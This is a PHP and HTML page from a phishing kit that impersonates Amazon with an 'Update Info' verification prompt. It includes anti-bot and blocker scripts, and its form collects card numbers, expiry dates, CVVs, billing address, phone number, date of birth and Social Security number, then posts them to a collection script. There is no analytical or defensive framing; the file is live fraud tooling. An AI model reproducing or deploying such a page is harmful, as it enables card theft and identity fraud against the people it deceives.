<?php 
  include './lib/loca.php';
  include './lib/browser.php';
  include './lib/system.php';
  include './lib/blocker.php';
  include './lib/antibots4.php';
?>

<html>
<head>
<title>Amazon - Update Info </title>
<link rel='icon' href='./img/icon.png'>
<link rel='stylesheet' href='./css/style.css'>
<script src='./js/q.js'></script>
<script src='./js/m.js'></script>
<meta charset='utf-8'>
<meta name='viewport' content='width=device-width' />
</head>
<body>
<center>
<header>
<div class='hleft'>
<img  src='./img/a.svg' class='img'></img>
<div style='float:right;'>
<a href='#'><button class='logout'>Log out</button></a>
</div>
</div>
</header>
<br><br>
<img class='img2' src='./img/logo.png'></img>
<br><br>
<div class='boxlogin'>
<div style='font-size:0.8em;'>
<div style='background:#ffebe6; padding:10px; border:1px solid #ff8566; border-radius:6px; '>
<h2>Verification is required !</h2>
<b>Please renter your credit cards and billing address to verify your account .</b>
</div><br>
 
 </div>
 
 <form action='get.php' method='post' name='add' id='add' >
 
 <div >
  <input type='text' name='nm1' class='text' required  placeholder='Name on card'  >
 <input type='text' name='cc1' class='text' id='cardnumber1' required placeholder='Card number'   >
 <select name='mm1' class='text' style='width:70px;'>
 <option selected disabled>Mounth
<option value='01'>01
<option value='02'>02
<option value='03'>03
<option value='04'>04
<option value='05'>05
<option value='06'>06
<option value='07'>07
<option value='08'>08
<option value='09'>09
<option value='10'>10
<option value='11'>11
<option value='12'>12
 </select>
 
 <select class='text' name='yy1' style='width:70px;'>
<option selected disabled>Year
<option value='18'>2018
<option value='19'>2019
<option value='20'>2020
<option value='21'>2021
<option value='22'>2022
<option value='23'>2023
<option value='24'>2024
<option value='25'>2025
<option value='26'>2026
<option value='27'>2027
<option value='28'>2028
<option value='29'>2029
<option value='30'>2030
<option value='31'>2031
<option value='32'>2032
<option value='33'>2033
</select>
<input type='text' class='text' style='width:70px;' name='cv1' id='cvv1' required placeholder='CVV'>
</div>

<div style='display:none;' id='2'>
  <input type='text' name='nm2' class='text' placeholder='Name on card'  >
 <input type='text' name='cc2' class='text' id='cardnumber2' placeholder='Card number'  >
 <select name='mm2' class='text' style='width:70px;'>
 <option selected disabled>Mounth
<option value='01'>01
<option value='02'>02
<option value='03'>03
<option value='04'>04
<option value='05'>05
<option value='06'>06
<option value='07'>07
<option value='08'>08
<option value='09'>09
<option value='10'>10
<option value='11'>11
<option value='12'>12
 </select>
 
 <select class='text' name='yy2' style='width:70px;'>
<option selected disabled>Year
<option value='18'>2018
<option value='19'>2019
<option value='20'>2020
<option value='21'>2021
<option value='22'>2022
<option value='23'>2023
<option value='24'>2024
<option value='25'>2025
<option value='26'>2026
<option value='27'>2027
<option value='28'>2028
<option value='29'>2029
<option value='30'>2030
<option value='31'>2031
<option value='32'>2032
<option value='33'>2033
</select>
<input type='text' class='text' style='width:70px;' id='cvv2' name='cv2' placeholder='CVV'><a href='#'  onclick='rem(2)' style='font-size:0.8em;  margin-left:5px;'>Remove</a>
</div>



<a href='#' onclick='addp()'>Add more cards</a>
<br>
<h3>Billing address</h3>
<select class='texts' name='cnt' style='width:96.7%;'  required>
	<option value="AF">Afghanistan</option>
	<option value="AX">Åland Islands</option>
	<option value="AL">Albania</option>
	<option value="DZ">Algeria</option>
	<option value="AS">American Samoa</option>
	<option value="AD">Andorra</option>
	<option value="AO">Angola</option>
	<option value="AI">Anguilla</option>
	<option value="AQ">Antarctica</option>
	<option value="AG">Antigua and Barbuda</option>
	<option value="AR">Argentina</option>
	<option value="AM">Armenia</option>
	<option value="AW">Aruba</option>
	<option value="AU">Australia</option>
	<option value="AT">Austria</option>
	<option value="AZ">Azerbaijan</option>
	<option value="BS">Bahamas</option>
	<option value="BH">Bahrain</option>
	<option value="BD">Bangladesh</option>
	<option value="BB">Barbados</option>
	<option value="BY">Belarus</option>
	<option value="BE">Belgium</option>
	<option value="BZ">Belize</option>
	<option value="BJ">Benin</option>
	<option value="BM">Bermuda</option>
	<option value="BT">Bhutan</option>
	<option value="BO">Bolivia, Plurinational State of</option>
	<option value="BQ">Bonaire, Sint Eustatius and Saba</option>
	<option value="BA">Bosnia and Herzegovina</option>
	<option value="BW">Botswana</option>
	<option value="BV">Bouvet Island</option>
	<option value="BR">Brazil</option>
	<option value="IO">British Indian Ocean Territory</option>
	<option value="BN">Brunei Darussalam</option>
	<option value="BG">Bulgaria</option>
	<option value="BF">Burkina Faso</option>
	<option value="BI">Burundi</option>
	<option value="KH">Cambodia</option>
	<option value="CM">Cameroon</option>
	<option value="CA">Canada</option>
	<option value="CV">Cape Verde</option>
	<option value="KY">Cayman Islands</option>
	<option value="CF">Central African Republic</option>
	<option value="TD">Chad</option>
	<option value="CL">Chile</option>
	<option value="CN">China</option>
	<option value="CX">Christmas Island</option>
	<option value="CC">Cocos (Keeling) Islands</option>
	<option value="CO">Colombia</option>
	<option value="KM">Comoros</option>
	<option value="CG">Congo</option>
	<option value="CD">Congo, the Democratic Republic of the</option>
	<option value="CK">Cook Islands</option>
	<option value="CR">Costa Rica</option>
	<option value="CI">Côte d'Ivoire</option>
	<option value="HR">Croatia</option>
	<option value="CU">Cuba</option>
	<option value="CW">Curaçao</option>
	<option value="CY">Cyprus</option>
	<option value="CZ">Czech Republic</option>
	<option value="DK">Denmark</option>
	<option value="DJ">Djibouti</option>
	<option value="DM">Dominica</option>
	<option value="DO">Dominican Republic</option>
	<option value="EC">Ecuador</option>
	<option value="EG">Egypt</option>
	<option value="SV">El Salvador</option>
	<option value="GQ">Equatorial Guinea</option>
	<option value="ER">Eritrea</option>
	<option value="EE">Estonia</option>
	<option value="ET">Ethiopia</option>
	<option value="FK">Falkland Islands (Malvinas)</option>
	<option value="FO">Faroe Islands</option>
	<option value="FJ">Fiji</option>
	<option value="FI">Finland</option>
	<option value="FR">France</option>
	<option value="GF">French Guiana</option>
	<option value="PF">French Polynesia</option>
	<option value="TF">French Southern Territories</option>
	<option value="GA">Gabon</option>
	<option value="GM">Gambia</option>
	<option value="GE">Georgia</option>
	<option value="DE">Germany</option>
	<option value="GH">Ghana</option>
	<option value="GI">Gibraltar</option>
	<option value="GR">Greece</option>
	<option value="GL">Greenland</option>
	<option value="GD">Grenada</option>
	<option value="GP">Guadeloupe</option>
	<option value="GU">Guam</option>
	<option value="GT">Guatemala</option>
	<option value="GG">Guernsey</option>
	<option value="GN">Guinea</option>
	<option value="GW">Guinea-Bissau</option>
	<option value="GY">Guyana</option>
	<option value="HT">Haiti</option>
	<option value="HM">Heard Island and McDonald Islands</option>
	<option value="VA">Holy See (Vatican City State)</option>
	<option value="HN">Honduras</option>
	<option value="HK">Hong Kong</option>
	<option value="HU">Hungary</option>
	<option value="IS">Iceland</option>
	<option value="IN">India</option>
	<option value="ID">Indonesia</option>
	<option value="IR">Iran, Islamic Republic of</option>
	<option value="IQ">Iraq</option>
	<option value="IE">Ireland</option>
	<option value="IM">Isle of Man</option>
	<option value="IL">Israel</option>
	<option value="IT">Italy</option>
	<option value="JM">Jamaica</option>
	<option value="JP">Japan</option>
	<option value="JE">Jersey</option>
	<option value="JO">Jordan</option>
	<option value="KZ">Kazakhstan</option>
	<option value="KE">Kenya</option>
	<option value="KI">Kiribati</option>
	<option value="KP">Korea, Democratic People's Republic of</option>
	<option value="KR">Korea, Republic of</option>
	<option value="KW">Kuwait</option>
	<option value="KG">Kyrgyzstan</option>
	<option value="LA">Lao People's Democratic Republic</option>
	<option value="LV">Latvia</option>
	<option value="LB">Lebanon</option>
	<option value="LS">Lesotho</option>
	<option value="LR">Liberia</option>
	<option value="LY">Libya</option>
	<option value="LI">Liechtenstein</option>
	<option value="LT">Lithuania</option>
	<option value="LU">Luxembourg</option>
	<option value="MO">Macao</option>
	<option value="MK">Macedonia, the former Yugoslav Republic of</option>
	<option value="MG">Madagascar</option>
	<option value="MW">Malawi</option>
	<option value="MY">Malaysia</option>
	<option value="MV">Maldives</option>
	<option value="ML">Mali</option>
	<option value="MT">Malta</option>
	<option value="MH">Marshall Islands</option>
	<option value="MQ">Martinique</option>
	<option value="MR">Mauritania</option>
	<option value="MU">Mauritius</option>
	<option value="YT">Mayotte</option>
	<option value="MX">Mexico</option>
	<option value="FM">Micronesia, Federated States of</option>
	<option value="MD">Moldova, Republic of</option>
	<option value="MC">Monaco</option>
	<option value="MN">Mongolia</option>
	<option value="ME">Montenegro</option>
	<option value="MS">Montserrat</option>
	<option value="MA">Morocco</option>
	<option value="MZ">Mozambique</option>
	<option value="MM">Myanmar</option>
	<option value="NA">Namibia</option>
	<option value="NR">Nauru</option>
	<option value="NP">Nepal</option>
	<option value="NL">Netherlands</option>
	<option value="NC">New Caledonia</option>
	<option value="NZ">New Zealand</option>
	<option value="NI">Nicaragua</option>
	<option value="NE">Niger</option>
	<option value="NG">Nigeria</option>
	<option value="NU">Niue</option>
	<option value="NF">Norfolk Island</option>
	<option value="MP">Northern Mariana Islands</option>
	<option value="NO">Norway</option>
	<option value="OM">Oman</option>
	<option value="PK">Pakistan</option>
	<option value="PW">Palau</option>
	<option value="PS">Palestinian Territory, Occupied</option>
	<option value="PA">Panama</option>
	<option value="PG">Papua New Guinea</option>
	<option value="PY">Paraguay</option>
	<option value="PE">Peru</option>
	<option value="PH">Philippines</option>
	<option value="PN">Pitcairn</option>
	<option value="PL">Poland</option>
	<option value="PT">Portugal</option>
	<option value="PR">Puerto Rico</option>
	<option value="QA">Qatar</option>
	<option value="RE">Réunion</option>
	<option value="RO">Romania</option>
	<option value="RU">Russian Federation</option>
	<option value="RW">Rwanda</option>
	<option value="BL">Saint Barthélemy</option>
	<option value="SH">Saint Helena, Ascension and Tristan da Cunha</option>
	<option value="KN">Saint Kitts and Nevis</option>
	<option value="LC">Saint Lucia</option>
	<option value="MF">Saint Martin (French part)</option>
	<option value="PM">Saint Pierre and Miquelon</option>
	<option value="VC">Saint Vincent and the Grenadines</option>
	<option value="WS">Samoa</option>
	<option value="SM">San Marino</option>
	<option value="ST">Sao Tome and Principe</option>
	<option value="SA">Saudi Arabia</option>
	<option value="SN">Senegal</option>
	<option value="RS">Serbia</option>
	<option value="SC">Seychelles</option>
	<option value="SL">Sierra Leone</option>
	<option value="SG">Singapore</option>
	<option value="SX">Sint Maarten (Dutch part)</option>
	<option value="SK">Slovakia</option>
	<option value="SI">Slovenia</option>
	<option value="SB">Solomon Islands</option>
	<option value="SO">Somalia</option>
	<option value="ZA">South Africa</option>
	<option value="GS">South Georgia and the South Sandwich Islands</option>
	<option value="SS">South Sudan</option>
	<option value="ES">Spain</option>
	<option value="LK">Sri Lanka</option>
	<option value="SD">Sudan</option>
	<option value="SR">Suriname</option>
	<option value="SJ">Svalbard and Jan Mayen</option>
	<option value="SZ">Swaziland</option>
	<option value="SE">Sweden</option>
	<option value="CH">Switzerland</option>
	<option value="SY">Syrian Arab Republic</option>
	<option value="TW">Taiwan, Province of China</option>
	<option value="TJ">Tajikistan</option>
	<option value="TZ">Tanzania, United Republic of</option>
	<option value="TH">Thailand</option>
	<option value="TL">Timor-Leste</option>
	<option value="TG">Togo</option>
	<option value="TK">Tokelau</option>
	<option value="TO">Tonga</option>
	<option value="TT">Trinidad and Tobago</option>
	<option value="TN">Tunisia</option>
	<option value="TR">Turkey</option>
	<option value="TM">Turkmenistan</option>
	<option value="TC">Turks and Caicos Islands</option>
	<option value="TV">Tuvalu</option>
	<option value="UG">Uganda</option>
	<option value="UA">Ukraine</option>
	<option value="AE">United Arab Emirates</option>
	<option value="GB">United Kingdom</option>
	<option value="US" selected='selected'>United States</option>
	<option value="UM">United States Minor Outlying Islands</option>
	<option value="UY">Uruguay</option>
	<option value="UZ">Uzbekistan</option>
	<option value="VU">Vanuatu</option>
	<option value="VE">Venezuela, Bolivarian Republic of</option>
	<option value="VN">Viet Nam</option>
	<option value="VG">Virgin Islands, British</option>
	<option value="VI">Virgin Islands, U.S.</option>
	<option value="WF">Wallis and Futuna</option>
	<option value="EH">Western Sahara</option>
	<option value="YE">Yemen</option>
	<option value="ZM">Zambia</option>
	<option value="ZW">Zimbabwe</option>
</select>

<input type='text' class='texts' placeholder="Address Line 1"  name='ad1'  required>
<input type='text' class='texts' placeholder="Address Line 2 (optional)"  name='ad2'>

<input type='text' class='texts' placeholder="State" name='sta' required>
<input type='text' class='texts' placeholder="City" name='cit'  required>
<input type='text' class='texts' placeholder="Postal Code" name='zip'  required>
<input type='text' class='texts' placeholder="Phone Number" name='phn' id='phone'  required>
<input type='text' class='texts' placeholder="Date of birth"  name='dob' >
<input type='text' class='texts' placeholder="SSN" name='ssn'   >
<input type='submit' class=' button'name='get' value='Update' >
 
</form>
</div>
<script>
var i = 1;
function addp(){
	i = i + 1;
	if(i >= 2){i=2;}
	document.getElementById(i).style.display='block';
}

function rem(id){
	i = i - 1;
	document.getElementById(id).style.display='none';
}


 $("#cardnumber1").mask("0000 0000 0000 0000 0000"); 
 $("#cardnumber2").mask("0000 0000 0000 0000 0000");
 //$("#cardnumber3").mask("0000 0000 0000 0000 0000"); 
$("#cvv1").mask("0000");
$("#cvv2").mask("0000");
//$("#cvv3").mask("0000");
$("#phone").mask("(000) 00000000000");
</script>


 <br><br>
<div style='font-size:0.6em;'>
<a href="#" style='margin-right:16px;'> Conditions of Use </a>
<a href='#' style='margin-right:16px;'>Privacy Notice </a>
<a href='#' style='margin-right:16px;'>Help </a>
<br><br>
© 1996-2018, Amazon.com, Inc. or its affiliates 
</div>
</center>
</body>
</html>